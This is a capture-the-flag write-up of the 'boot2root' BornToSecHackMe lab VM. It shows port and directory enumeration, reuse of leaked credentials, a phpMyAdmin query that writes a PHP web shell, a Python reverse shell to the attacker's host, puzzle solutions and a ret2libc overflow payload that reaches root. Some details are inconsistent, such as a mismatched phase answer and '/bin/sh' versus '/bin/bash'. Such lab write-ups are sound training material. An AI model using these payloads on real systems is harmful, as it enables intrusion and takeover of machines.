## 1. Enumerate Open Ports

First, we start by scanning the target's open ports using **Nmap**.

```bash
xel@lucky7 ~/files/42/boot2root % nmap 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:35 CEST
Nmap scan report for 192.168.0.31
Host is up (0.00066s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

We identify that ports 21 (FTP), 22 (SSH), 80 (HTTP), 143 (IMAP), 443 (HTTPS), and 993 (IMAPS) are open. 

## 2. Perform a Full Version Scan

We now run a full **Nmap** scan with service detection and versioning to get detailed information about each open port.

```bash
xel@lucky7 ~/files/42/boot2root % nmap -T4 -sVC -A -p 21,22,80,143,443,993 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:36 CEST
Nmap scan report for hackme.fr (192.168.0.31)
Host is up (0.00028s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
|_imap-capabilities: more ENABLE have listed IDLE ID post-login SASL-IR capabilities STARTTLS IMAP4rev1 Pre-login OK LITERAL+ LOGIN-REFERRALS LOGINDISABLEDA0001
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
993/tcp open  ssl/imaps?
|_ssl-date: 2024-10-03T10:36:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 3. Directory Fuzzing with FFUF

### HTTP Enumeration

We use **ffuf** to brute-force directories on the HTTP service (port 80):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u http://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.31/FUZZ
 :: Wordlist         : FUZZ: /home/xel/files/pentest/directory-list-medium
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

forum                   [Status: 403, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 2ms]
```

Here, we discovered:
- A **/forum** directory, but it is restricted (403 Forbidden).
- A **/fonts** directory, which redirects (301) elsewhere.
- The **/server-status** endpoint is also forbidden (403).

### HTTPS Enumeration

We repeat the process for the HTTPS service (port 443):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u https://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://192.168.0.31/FUZZ
 :: Wordlist         : FUZZ: /home/xel/files/pentest/directory-list-medium
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

forum                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
webmail                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 5ms]
server-status           [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 2ms]
```

For HTTPS, we find:
- A **/forum** directory, which redirects (301).
- A **/webmail** directory, likely for accessing the mail service.
- A **/phpmyadmin** directory, which could provide access to the database management system (MySQL).

## 4. Web browsing

### Forum
Let's start by exploring the **/forum** directory. While browsing the forum, we notice that the user **lmezard** leaks their password: `!q\]Ej?*5K5cy*AJ`. We attempt to log in with their credentials, and it works.

In their user profile, we find their email: **laurie@borntosec.net**. Aside from this, there doesn't seem to be anything else of interest in the forum.

### Webmail
Navigating to the **/webmail** directory, we are presented with a login interface. We decide to try **lmezard's** email (`laurie@borntosec.net`) and the leaked password, and bingo, it works! 

We found this mail:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

The password is hashed with a salt, making it practically uncrackable due to the random string appended to the hash.

## 5. SQL

However, having access to **phpMyAdmin** allows us to execute arbitrary SQL code. We can potentially use this to upload a PHP file that will execute commands on the server.

We try creating a PHP file that can be accessed from the browser and executed. After testing various accessible directories (`/images/`, `/themes/`, `/includes/`), we find that only the `/templates_c/` directory works.

We run the following SQL query to upload a PHP script into the directory:

```sql
SELECT "<?php system('id'); ?>" INTO OUTFILE '/var/www/forum/templates_c/id.php';
```

Once the file is created, we access it through the browser and successfully execute the **id** command:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that we are now running commands as the **www-data** user, which opens up further possibilities for privilege escalation.

## 6. Get a Reverse Shell

### Setting up a webshell

Now, let's set up a **web shell** to gain more control over the target system. We will modify our SQL query to create a simple PHP web shell that can execute system commands:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/webshell.php';
```

We can now access this web shell by using `curl` to send commands to it:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that our web shell is working and executing commands as the **www-data** user.

### Setting Up a Reverse Shell

Next, we set up a listener on our host machine to catch the reverse shell:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
```

To establish a reverse shell on the target, we take a Python reverse shell script from the **[Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)**. 

```python
export RHOST="192.168.0.24";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

We encode the payload using **CyberChef** with URL encoding, resulting in the following command:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=export%20RHOST%3D%22192%2E168%2E0%2E24%22%3Bexport%20RPORT%3D4444%3Bpython%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27'
```

Now, when the reverse shell connects, we receive a connection on our listener:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.31 50782
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We now have a reverse shell running as the **www-data** user, giving us command execution on the target system.

## 7. Exploring the Target

While exploring the `/home` directory, we notice a folder named **LOOKATME** owned by the **www-data** user. Inside this directory, we find a file named `password`.

```bash
$ cat password
lmezard:G!@M6f4Eatau{sF"
```

We attempt to use these credentials to connect via **SSH**, but they don’t work. However, when we try logging into **FTP**, it works!

### FTP Access

```bash
xel@lucky7 ~/files/42/boot2root % ftp 192.168.0.31 

Connected to 192.168.0.31.
220 Welcome on this server
Name (192.168.0.31:xel): lmezard
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10673|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxrwxrwx    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||23492|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*************************************************************************************************|   790 KiB   14.80 MiB/s    00:00 ETA
226 Transfer complete.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||19402|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*************************************************************************************************|    96      801.28 KiB/s    00:00 ETA
226 Transfer complete.
```

The **README** file contains a challenge that must be completed to unlock further access:

```bash
xel@lucky7 ~/files/42/boot2root % cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

We also download a file named **fun** from the FTP server. Let’s investigate this file further:

```bash
xel@lucky7 ~/files/42/boot2root % file fun 
fun: POSIX tar archive (GNU)
```

The file is a tar archive, so we extract it:

```bash
xel@lucky7 ~/files/42/boot2root % tar -xvf fun
```

The extraction creates a directory named **ft_fun**, containing 750 files.
Each of the 750 files follows a similar structure:

```bash
xel@lucky7 ~/files/42/boot2root/ft_fun % cat 0564G.pcap 
}void useless() {

//file355
```

It becomes apparent that each file contains a small fragment of C code, and they all have comments indicating their position (e.g., `//file355`). Our task is to reconstruct the full C program by piecing together the fragments in the correct order based on these comments.

## 8. Rebuilding the Code

We will now proceed with writing a Python script to automate the extraction and ordering of the code snippets to solve this challenge. 

Here’s the Python script to automate this process:

```python
import os
import re

directory = "./ft_fun/"
fragments = {}
pattern = re.compile(r'//file(\d+)')

for filename in os.listdir(directory):
    filepath = os.path.join(directory, filename)
    
    with open(filepath, 'r') as file:
        content = file.read()
        match = pattern.search(content)
        if match:
            file_number = int(match.group(1))
            fragments[file_number] = content.strip()

ordered_fragments = dict(sorted(fragments.items()))

with open("main.c", "w") as output_file:
    for _, fragment in ordered_fragments.items():
        output_file.write(fragment + "\n")
```

### Compiling and Running the Code

Once the C code is reconstructed, we can compile and run it to retrieve the final password.

```bash
xel@lucky7 ~/files/42/boot2root/ % gcc main.c
xel@lucky7 ~/files/42/boot2root/ft_fun % ./main.c

MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

To complete the challenge, we are asked to hash the password using the **SHA-256** algorithm. We can do this using the following command:

```bash
xel@lucky7 ~/files/42/boot2root/ % echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

xel@lucky7 ~/files/42@BornToSecHackMe:~$/boot2root/ % ssh laurie@192.168.0.31
laurie@192.168.0.31's password:

laurie@BornToSecHackMe:~$
```

## 9. laurie session

After gaining laurie access, we explore Laurie’s home directory and find two files: **bomb** and **README**.

```bash
laurie@BornToSecHackMe:~$ ls
bomb  README

laurie@BornToSecHackMe:~$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
```

The **bomb** file is a 32-bit ELF binary, meaning it’s an executable file. Let’s read the **README** for instructions:

```bash
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The **README** gives us a hint about diffusing the bomb and indicates that the password we extract from it should be used to log in as the **thor** user via SSH.

### Reversing the Binary with Binary Ninja

Upon reverse engineering the **bomb** binary with **Binary Ninja**, we find that the program consists of 6 levels. Each level expects a specific string input, which we need to figure out by analyzing the binary. Once all the strings are entered correctly, we will have the complete password to log in as **thor**.

Phase 1:
The expected input is a string: `Public speaking is very easy.`

Phase 2:
The input is a sequence of factorials: `1 2 6 24 120 720`

Phase 3:
The input is a number, a char and another number: `1 b 214`

Phase 4:
The correct input is the number `9`.

Phase 5:
The input is a string: `opukmq`

Phase 6:
The input is a number sequence: `4 2 6 3 1 5`

### Concatenating the Password

To derive the password for the **thor** user, we concatenate the correct strings from all phases, following the rule in the **README** about no spaces in the password:

**Password for thor:**
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

Now that we have the password, we switch to the **thor** user:

```bash
laurie@BornToSecHackMe:~$ su thor
Password: 
thor@BornToSecHackMe:~$
```

## 10. thor session

After logging in as the **thor** user, we find two files in the home directory: **README** and **turtle**.

```bash
thor@BornToSecHackMe:~$ ls
README  turtle

thor@BornToSecHackMe:~$ cat README 
Finish this challenge and use the result as password for 'zaz' user.
```

The **README** informs us that solving this challenge will give us the password for the **zaz** user.

Next, we inspect the **turtle** file:

```bash
thor@BornToSecHackMe:~$ file turtle 
turtle: ASCII text

thor@BornToSecHackMe:~$ cat turtle | head -n 10
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
```

The **turtle** file contains instructions, such as moving forward, turning left, or turning right by a specific number of degrees or spaces. The name "turtle" hints at the use of **Turtle Graphics**, a Python library that allows drawing based on commands.

### Solving the Turtle Challenge

To visualize the instructions in the **turtle** file, we write a Python script that reads the file and executes the instructions using the **turtle** module.

Here’s the Python script:

```python
import turtle
import re

def parse_line(line, turtle_obj):
    forward_value = re.match(r"Avance (\d+) spaces", line)
    backward_value = re.match(r"Recule (\d+) spaces", line)
    left_value = re.match(r"Tourne gauche de (\d+) degrees", line)
    right_value = re.match(r"Tourne droite de (\d+) degrees", line)

    if forward_value:
        value = int(forward_value.group(1))
        turtle_obj.forward(value)
    elif backward_value:
        value = int(backward_value.group(1))
        turtle_obj.backward(value)
    elif left_value:
        value = int(left_value.group(1))
        turtle_obj.left(value)
    elif right_value:
        value = int(right_value.group(1))
        turtle_obj.right(value)

def parse_file_to_turtle():
    screen = turtle.Screen()
    screen.setup(1000, 1000)
    t = turtle.Turtle()

    with open('turtle', 'r') as f:
        content = f.readlines()

    for line in content:
        parse_line(line, t)

    turtle.done()

parse_file_to_turtle()
```

### Interpreting the Result

This Python script reads each line of the **turtle** file and interprets the instructions, using the **turtle** graphics library to draw the path on the screen. When the script is run, it visually draws the result of the instructions.

After running the script, we see that the drawn output reveals the message: **SLASH**.

The last line of the **turtle** file reads:


```
Can you digest the message? :)
```

This line hints that we need to **digest** (i.e., hash) the message **SLASH** to proceed. After testing several hashing algorithms, we find that the correct one is **MD5**.

Hashing the message **SLASH** with MD5 gives us the following hash:

```bash
echo -n "SLASH" | md5sum
646da671ca01bb5d84dbb5fb2238dc8e

thor@BornToSecHackMe:~$ su zaz
Password: 

zaz@BornToSecHackMe:~$
```

## 11. zaz session

After logging as the **zaz** user, we find an setuid guid **exploit_me** binary in the home directory.

### Reversing the Binary with Binary Ninja

```c
080483f4  int32_t main(int32_t argc, char** argv, char** envp)
080483f4  {
08048404      if (argc <= 1)
08048406          return 1;
08048406      
08048420      void str;
08048420      strcpy(&str, argv[1]);
0804842c      puts(&str);
08048431      return 0;
080483f4  }
```

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave  
   0x08048437 <+67>:    ret    
End of assembler dump.
(gdb) 
```

### Exploiting the Binary with ret2libc

The binary `exploit_me` is vulnerable to a **buffer overflow** in its use of `strcpy` without checking the size of the input. The goal is to exploit this overflow to perform a **ret2libc attack**, which involves hijacking the return address to execute the `system` function in libc, passing `/bin/bash` as an argument.

Finding the necessary addresses in libc:
```bash
(gdb) info proc map
process 1894
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000,0xb7fdd000,"/bin/sh"
0xb7f8cc58 -> /x58/xcc/xf8/xb7

(gdb) info function system
0xb7e6b060  system -> /x60/xb0/xe6/xb7

(gdb) info function exit
0xb7e5ebe0  exit -> /xe0/xeb/xe5/xb7
```

### Final payload
1. **`'A' * 140`**: Fills the buffer and overflows to overwrite the saved `EBP`.
2. **`'\x60\xb0\xe6\xb7'`**: The address of `system` in libc.
3. **`'\xe0\xeb\xe5\xb7'`**: The fake return address `exit`, used to avoid a crash after `system` finishes.
4. **`'\x58\xcc\xf8\xb7'`**: The address of the string `/bin/bash` in libc, passed as an argument to `system`.


The payload used is:
```bash
./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')")
```

```bash
root@BornToSecHackMe:~$ id

uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
``` 